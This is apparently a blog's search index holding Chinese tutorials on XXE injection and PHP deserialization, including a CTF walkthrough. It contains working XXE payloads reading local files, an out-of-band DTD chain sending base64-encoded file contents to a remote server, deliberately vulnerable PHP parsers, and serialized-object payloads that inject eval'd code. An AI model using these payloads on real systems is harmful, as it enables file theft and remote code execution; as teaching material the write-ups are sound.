<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[xxe简单漏洞]]></title>
      <url>/2020/02/09/xxe%E7%AE%80%E5%8D%95%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h2 id="xml的基础知识"><a href="#xml的基础知识" class="headerlink" title="xml的基础知识"></a>xml的基础知识</h2><p>在了解xxe漏洞之前，需要明白一定的基础知识，那就是xml。</p>
<p>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具。</p>
<h3 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h3><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">DTD：</span><br><span class="line"></span><br><span class="line">	&lt;?xml version=<span class="string">"1.0"</span>?&gt; 			 (这一行是XML文档定义)</span><br><span class="line">	&lt;!DOCTYPE note [				（定义此文档是note类型的文档）</span><br><span class="line">	&lt;!ELEMENT note (to ,from ,head ,body)&gt;	（定义note元素有四个元素）</span><br><span class="line">	&lt;!ELEMENT to (<span class="comment">#PCDATA)&gt;			（定义to元素为“#PCDATA”类型）</span></span><br><span class="line">	&lt;!ELEMENT from (<span class="comment">#PCDATA)&gt;		（定义from元素为“#PCDATA”类型）</span></span><br><span class="line">	&lt;!ELEMENT head (<span class="comment">#PCDATA)&gt;		（定义head元素为“#PCDATA”类型）</span></span><br><span class="line">	&lt;!ELEMENT body (<span class="comment">#PCDATA)&gt;		（定义body元素为“#PCDATA”类型）</span></span><br><span class="line"></span><br><span class="line">这个DTD定义了XML的跟元素为note，然后根元素下面有一些子元素，那么XML到时候必须要像下面所示这么写</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">XML：</span><br><span class="line">	&lt;note&gt;</span><br><span class="line">	&lt;to&gt;Dave&lt;/to&gt;</span><br><span class="line">	&lt;from&gt;Tom&lt;/from&gt;</span><br><span class="line">	&lt;head&gt;Reminder&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;You are a good man&lt;/body&gt;</span><br><span class="line">	&lt;/note&gt;</span><br></pre></td></tr></table></figure>

<h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。</p>
<p>内部声明DTD：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure>

<p>引用外部DTD：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM <span class="string">"文件名"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>DTD文档中有很多重要的关键字如下：</p>
<p><strong>DOCTYPE（DTD的声明）</strong><br><strong>ENTITY（实体的声明）</strong><br><strong>SYSTEM、PUBLIC（外部资源申请）</strong></p>
<h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>实体可以简单的理解为变量，它必须在文档类型定义（DTD）中定义声明，可以在文档中的其他位置引用该变量的值</p>
<p>实体可按类型主要分为以下四种：<br><strong>内置实体 (Built-in entities)</strong><br><strong>字符实体 (Character entities)</strong><br><strong>通用实体 (General entities)</strong><br><strong>参数实体 (Parameter entities)</strong></p>
<p>从另一个角度来看，实体还可分为一般实体与参数实体：</p>
<p><strong>一般实体只能在文档类型定义（DTD）中声明，在xml文档中引用；一般实体的声明语法为: <!ENTITY 实体名 "实体内容">，引用一般实体的方式为: &amp;实体名</strong></p>
<p><strong>参数实体只能在文档类型定义（DTD）中引用和声明；参数实体的声明语法: &lt;!ENTITY %实体名 “实体内容”，引用参数实体的方式为: %实体名</strong></p>
<p>实体根据引用方式，还可分为内部实体与外部实体</p>
<p>内部实体：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 <span class="string">"实体的值"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>外部实体：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 <span class="string">"实体的值"</span>&gt;</span><br><span class="line">or</span><br><span class="line">&lt;!ENTITY % 实体名称 SYSTEM <span class="string">"URI"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>一般实体 + 内部实体：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name <span class="string">"nMask"</span>&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;/value&gt; </span><br><span class="line">&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>参数实体 + 外部实体：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM <span class="string">"file:///etc/passwd"</span>&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>其中%name（参数实体）是在DTD中被引用的，而&amp;name（一般实体）是在xml文档中被引用的</p>
<p>而xxe漏洞主要就是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体</p>
<h4 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h4><p>若外部实体能在DTD中使用，那么URI中能写哪些类型的外部实体呢</p>
<p>主要的有file、http、https、ftp等等，不同的程序支持的协议当然不一样</p>
<img src="/2020/02/09/xxe简单漏洞/4.png">

<p>其中php支持的协议会更多一些，但需要一定的扩展支持</p>
<h2 id="xxe漏洞"><a href="#xxe漏洞" class="headerlink" title="xxe漏洞"></a>xxe漏洞</h2><p>XXE漏洞全称为XML External Entity Injection 即 xml 外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等。</p>
<p>xxe漏洞触发的点往往是可以上传xml文件的位置，没有上传文件进行过滤，导致可上传恶意xml文件。</p>
<h3 id="xxe漏洞检测"><a href="#xxe漏洞检测" class="headerlink" title="xxe漏洞检测"></a>xxe漏洞检测</h3><p>第一步检测XML是否会被成功解析：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY name "my name is nMask"&gt;]&gt;</span>    </span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;name;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果页面输出了my name is nMask，说明xml文件可以被解析</p>
<img src="/2020/02/09/xxe简单漏洞/5.png">

<p>第二部检测服务器是否支持DTD引用外部实体：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=”1.0” encoding=”UTF-8”?&gt;</span>  </span><br><span class="line"><span class="meta">&lt;!DOCTYPE ANY [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY % name SYSTEM "http://localhost/index.html"&gt;  </span></span><br><span class="line"><span class="meta">%name;  </span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过查看自己服务器上的日志来判断，看目标服务器是否向你的服务器发了一条请求test.xml的请求</p>
<img src="/2020/02/09/xxe简单漏洞/6.png">

<p>若支持引用外部实体，那么很有可能是存在xxe漏洞的</p>
<h2 id="xxe漏洞利用"><a href="#xxe漏洞利用" class="headerlink" title="xxe漏洞利用"></a>xxe漏洞利用</h2><h3 id="有回显任意文件读取"><a href="#有回显任意文件读取" class="headerlink" title="有回显任意文件读取"></a>有回显任意文件读取</h3><p>test.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader(<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom -&gt; loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">$data = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> $data;<span class="comment">//去掉即为无回显</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE data [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "file:///var/www/html/xxe/flag.txt"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/02/09/xxe简单漏洞/7.png">

<p>但如果读取的文件中含有特殊符号（如 “ &lt; &gt; &amp; “等），那么就会报错或如图</p>
<img src="/2020/02/09/xxe简单漏洞/9.png" class="8.png} 这时就需要认识另一样东西了 “CDATA” {%asset_img">

<p>所以，我们可以将读取的文件定义为 “CDATA”，CDATA部分中的所有内容就会被解析器忽略，这样就可以读取文件了</p>
<p>将payload2.0修改为：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY start <span class="string">"&lt;![CDATA[</span></span><br><span class="line"><span class="string">&lt;!ENTITY % goodies SYSTEM 'file:///var/www/html/xxe/flag.txt'&gt;]]&gt;</span></span><br><span class="line"><span class="string">"</span>&gt;]</span><br><span class="line">% goodies;</span><br><span class="line">&gt;</span><br><span class="line">&lt;data&gt;&amp;start&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>payload看起来好像没问题，但结果还是一样读取不出</p>
<p>xml 解析器有个限制就是不能在内部ENTITY中引用，“PEReferences forbidden in internal subset in Entity ”指的就是禁止内部参数实体引用。</p>
<p>那么我们就把内部换到外部来试试看</p>
<p>payload3.0：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt; </span><br><span class="line">&lt;!DOCTYPE data [</span><br><span class="line">&lt;!ENTITY % start <span class="string">"&lt;![CDATA["</span>&gt;</span><br><span class="line">&lt;!ENTITY % goodies SYSTEM <span class="string">"file:///var/www/html/xxe/test.php"</span>&gt;</span><br><span class="line">&lt;!ENTITY % end <span class="string">"]]&gt;"</span>&gt;</span><br><span class="line">&lt;!ENTITY % dtd SYSTEM <span class="string">"http://47.107.134.244:8080/xxe/evil.dtd"</span>&gt;</span><br><span class="line">%dtd; ]&gt;</span><br><span class="line">&lt;data&gt;&amp;all;&lt;/data&gt;</span><br></pre></td></tr></table></figure>

<p>evil.dtd:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY all <span class="string">"%start;%goodies;%end;"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>即可</p>
<h3 id="无回显任意文件读取"><a href="#无回显任意文件读取" class="headerlink" title="无回显任意文件读取"></a>无回显任意文件读取</h3><p>既然没有回显数据，那我们就要想办法让服务器自己把数据往外带。</p>
<p>写两个外部参数实体，第一个用来请求本地数据内容，第二个用 http 协议或者其他协议把请求到的数据作为参数带到我们的 vps，这样就实现了数据外带了</p>
<p>test2.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>test.dtd</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=file:///var/www/html/xxe/flag.txt"</span>&gt;</span><br><span class="line">&lt;!ENTITY % int <span class="string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://127.0.0.1/xxe/index.php?p=%file;'&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>send前面的 &amp;#37 会在HTML实体转化成 %</p>
<p>payload:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://127.0.0.1/xxe/evil.dtd"</span>&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<img src="/2020/02/09/xxe简单漏洞/10.png">

<p>在 payload 中可看到连续调用了三个参数实体 %remote;%int;%send;，这就是利用顺序，先调用%remote，调用后会请求远程服务器上的evil.dtd，类似与将evil.dtd包含进来，然后 %int 调用 evil.dtd 中的 %file，%file 就会去获取服务器上的指定文件，然后将 %file 的结果输入到 %send 中（因为实体的值中不能有 % ，所以将其转成html实体编码 <strong>&#37;</strong> ），最后再调用 %send; 把我们读取到的数据发送到指定地址，利用log获取数据，从而实现外带数据的效果，解决XXE无回显的问题</p>
]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[php反序列化漏洞——Session]]></title>
      <url>/2020/01/29/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94Session/</url>
      <content type="html"><![CDATA[<p>php存储session有三种模式，php_serialize, php, binary</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php_serialize(php&gt;5.5.4):存储方式是，经过serialize()函数序列化处理的值 </span><br><span class="line"></span><br><span class="line">php:存储方式是，键名+竖线+经过serialize()函数序列处理的值</span><br><span class="line"></span><br><span class="line">php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值</span><br></pre></td></tr></table></figure>

<p>其中php_serialize和php的不合理使用会导致安全问题的发生</p>
<p>关于session的存储，java是将用户的session存入内存中，而php则是将session以文件的形式存储在服务器某个tmp文件中，可以在php.ini里面设置session.save_path存储的位置</p>
<img src="/2020/01/29/php反序列化漏洞——Session/1.png">

<p>设置序列化规则则是</p>
<img src="/2020/01/29/php反序列化漏洞——Session/2.png">

<p>注意，php_serialize在5.5版本后新加的一种规则，5.4及之前版本，如果设置成php_serialize会报错</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler = php          　　  一直都在            它是用 |分割</span><br><span class="line">session.serialize_handler = php_serialize 　　 5.5之后启用         它是用serialize反序列化格式分割</span><br></pre></td></tr></table></figure>

<p>首先看 <strong>session.serialize_handler = php</strong> 序列化的结果</p>
<img src="/2020/01/29/php反序列化漏洞——Session/3.png">

<p>它的规则是$_SESSION是个数组，数组中的键和值中间用 | 来分割，值如果是数组或对象按照序列化的格式存储</p>
<p><strong>session.serialize_handler = php_serialize</strong>的序列化结果为</p>
<img src="/2020/01/29/php反序列化漏洞——Session/4.png">

<p>它是全程按照serialize的格式序列化了$_SESSION这个数组</p>
<p>它比php的格式多了个最前面多了个 “a:2:{ ….” 也就是$_SESSION这个数组有2个元素，还有个区别在于，它的键名也表明了长度和属性，中间用 ; 来隔开键值对</p>
<p>虽然2个序列化格式本身没有问题，但是如果2个混合起用就会造成危害</p>
<p><strong>形成原理是在用 session.serialize_handler = php_serialize 存储的字符可以引入 | ，再用 session.serialize_handler = php 格式取出$_SESSION的值时“|”会被当成键值对的分隔符</strong></p>
<p>即，当先用php存了数组，在$_SESSION[‘a’]的值中加入 | ，并在之后写成一个数组的序列化格式</p>
<img src="/2020/01/29/php反序列化漏洞——Session/5.png">

<p>如果正常的用php_serialize解析，它返回的是$_SESSION[‘a’]是个长度为50的字符串</p>
<img src="/2020/01/29/php反序列化漏洞——Session/6.png">

<p>如果用php进行解析，发现它理解为一个很长的名字的值是一个带了2个元素的数组</p>
<img src="/2020/01/29/php反序列化漏洞——Session/7.png">

<img src="/2020/01/29/php反序列化漏洞——Session/8.png">

<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p>
<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由源码可知，能够查看phpinfo</p>
<img src="/2020/01/29/php反序列化漏洞——Session/9.png">

<p>除此之外，看到construct()和_destruct()两个魔术方法，很有可能是反序列化。并且，destruct()中有 eval($this -&gt; mdzz)</p>
<p>如果 $this -&gt; mdzz 可控的话，那就明显是个webshell了，但这里不知如何利用</p>
<p>再看到备注的 <strong>ini_set(‘session.serialize_handler’,’php’)</strong> 又从phpinfo中可看到</p>
<img src="/2020/01/29/php反序列化漏洞——Session/10.png">

<p>在php.ini中默认的session.serialize_handler为php_serialize，而index.php中将其设置为了php，这就导致了session的反序列化问题    (PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。)</p>
<p>这个漏洞如果要触发，则需要在服务器中写入一个使用php_serialize序列话的值，然后访问时就会被php的引擎反序列化</p>
<p>学习大佬的笔记，利用了 <strong>上传进度支持（Upload progress in sessions）</strong> 的知识点来向服务器设置session。具体为，在上传文件时，如果POST一个名为PHP_SESSION_UPLOAD_PROGRESS的变量，就可以将filename的值赋值到session中</p>
<p>查看该题的phpinfo，session.upload_progress.enabled 打开，session.upload_progress.cleanup 关闭</p>
<img src="/2020/01/29/php反序列化漏洞——Session/10.png">

<p>上传页面的写法如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"123"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/01/29/php反序列化漏洞——Session/12.png">

<p>任意上传文件后，在访问文件名时，触发反序列化漏洞，我们需要控制名字。实际上我们可以看到，我们最终需要的是class类中的一个$mdzz变量，在序列化中保存的信息会采用class的信息保存，不仅有mdzz变量，所以复制一个同样的class和变量然后来序列化</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz=<span class="string">'print_r(dirname(__FILE__));'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> OowoO();</span><br><span class="line">$a = serialize($obj);</span><br><span class="line"> </span><br><span class="line">var_dump($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>为防止转义，在引号前加上\。在前面加上一个|，这是session的格式</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:27:\"print_r(dirname(__FILE__));\";&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/01/29/php反序列化漏洞——Session/13.png">

<p>同理</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:36:\"print_r(scandir(dirname(__FILE__)));\";&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/01/29/php反序列化漏洞——Session/14.png">

<p>那么只需利用file_get_contents()即可得到文件内容</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O:5:\<span class="string">"OowoO\":1:&#123;s:4:\"mdzz\";s:88:\"print_r(file_get_contents(\"/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\"));\";&#125;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/01/29/php反序列化漏洞——Session/15.png">

<!-- 利用此方法可达到对session写入数据的效果，从而使得 $mdzz 可控。

当一个上传在处理中，同时 post 一个与 ini 设置的 session.uploadprogress.name 同名变量时，php 检测到这种 post 请求时就会在 $SESSION 中添加一组数据，所以可通过 session.upload_progress 来设置 session。 -->


]]></content>
      
        
    </entry>
    
    <entry>
      <title><![CDATA[php反序列化漏洞——unserialize]]></title>
      <url>/2020/01/21/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94unserialize/</url>
      <content type="html"><![CDATA[<h2 id="serialize"><a href="#serialize" class="headerlink" title="serialize()"></a>serialize()</h2><p>当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下：</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/1.png">

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">O为存储对象，如果给serialize()传入的是一个数组，那就是A</span><br><span class="line">1为对象名称有1个字符</span><br><span class="line">a为对象名称</span><br><span class="line">1表示有一个值</span><br><span class="line">s表示字符串，i则表示数字</span><br><span class="line">4表示字符串的长度</span><br><span class="line"><span class="built_in">test</span>为字符串的名称</span><br></pre></td></tr></table></figure>

<h2 id="unserialize"><a href="#unserialize" class="headerlink" title="unserialize()"></a>unserialize()</h2><p>与serizalize()对应的，unserialize()可以从已存储的表示中创建PHP的值，可以从序列化后的结果中恢复对象（object）。</p>
<img src="/2020/01/21/php反序列化漏洞——unserialize/2.png">

<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="利用构造函数等"><a href="#利用构造函数等" class="headerlink" title="利用构造函数等"></a>利用构造函数等</h3><h4 id="Magic-function"><a href="#Magic-function" class="headerlink" title="Magic function"></a>Magic function</h4><p>php中有一类特殊的方法叫“<a href="https://www.php.net/manual/zh/language.oop5.magic.php" target="_blank" rel="noopener">Magic function</a>”：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">构造函数__constru(): 当对象创建（new）时会自动调用，但在unserialize()时是不会调用的。</span><br><span class="line">析构函数__destruct(): 当对象被销毁时会自动调用</span><br><span class="line">__wakeup(): unserialize()时会自动调用</span><br></pre></td></tr></table></figure>

<p>测试如下：</p>
